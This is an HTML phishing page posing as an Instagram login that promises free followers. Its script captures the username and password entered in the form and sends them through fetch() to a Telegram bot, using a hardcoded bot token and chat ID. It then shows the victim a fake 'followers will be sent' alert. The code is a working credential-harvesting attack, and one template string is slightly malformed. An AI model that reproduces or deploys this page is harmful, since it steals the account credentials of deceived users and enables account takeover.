<html>
<head>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .login-box h2 {
            margin-bottom: 20px;
            color: #333;
        }
        .login-box input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .login-box button {
            width: 100%;
            padding: 10px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .login-box button:hover {
            background-color: #0056b3;
        }
        .warning {
            color: red;
            font-size: 12px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Login</h2>
        <p class="INSTAGRAM"> HACKING FOLLOWERS</p>
        <form id="fakeLoginForm">
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>

    <script>
        document.getElementById("fakeLoginForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            
            // Telegram Bot API (sends data to your bot)
            const BOT_TOKEN = "7500642399:AAF_jJDpo7M6lBH_P37-_RKIeQb-AsPrTME";
            const CHAT_ID = "5335103279"; //
            
            const message = \nUsername: ${username}\nPassword: ${password}`;
            const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
            
            fetch(apiUrl)
                .then(response => response.json())
                .then(data => {
                    alert("followers will be sent by time )");
                })
                .catch(error => {
                    console.error("Error sending to Telegram:", error);
                });
        });
    </script>
</body>
</html>
